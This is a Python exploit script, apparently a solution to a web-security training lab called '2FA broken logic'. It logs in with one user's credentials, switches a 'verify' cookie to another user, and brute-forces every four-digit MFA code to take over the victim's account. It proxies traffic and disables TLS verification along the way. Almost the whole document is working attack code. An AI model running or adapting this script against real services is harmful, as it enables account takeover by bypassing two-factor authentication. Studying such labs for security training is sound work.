# 2FA broken logic

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def connect_as_wiener(s, url):
	login_path = url + '/login'
	time.sleep(1)
	data_login = {'username': 'wiener', 'password': 'peter'}
	print('\n[+] Sending connection to the application as Wiener...')
	r = s.post(login_path, data=data_login, allow_redirects=False)
	time.sleep(1)
	if r.status_code == 302:
		session = s.cookies.get('session')
		return session
	else:
		print('[-] Exploit failed to connect as Wiener <!>')
		sys.exit(1)

def connect_as_carlos(s, url, session):
	login_path = url + '/login2'
	time.sleep(1)
	cookies = {'session': session, 'verify': 'carlos'}
	print('\n[+] Trying to connect to the application as Carlos instead...')
	r = s.get(login_path, cookies=cookies)
	time.sleep(1)
	print('[+] Trying to brute-force the MFA verification code...')
	nums = "0123456789"
	# nums = "9876543210"
	for x1 in nums:
		for x2 in nums:
			for x3 in nums:
				for x4 in nums:
					code = f'{x1}{x2}{x3}{x4}'
					sys.stdout.write('\r[+] Trying 2FA code:\t%s' % code)
					data_login = {'mfa-code': code}
					r = s.post(login_path, data=data_login, cookies=cookies)
					# time.sleep(.05)
					sys.stdout.flush()
					if 'Your username is: carlos' in r.text:
						print('\n[+] Logged in as Carlos !')
						return r
	print('[-] Exploit failed to connect as Carlos <!>')
	sys.exit(1)

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: 2FA broken logic')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to bypass 2FA to access Carlos account...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			session = connect_as_wiener(s, url)
			s.cookies.clear()
			time.sleep(2)
			r = connect_as_carlos(s, url, session)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()
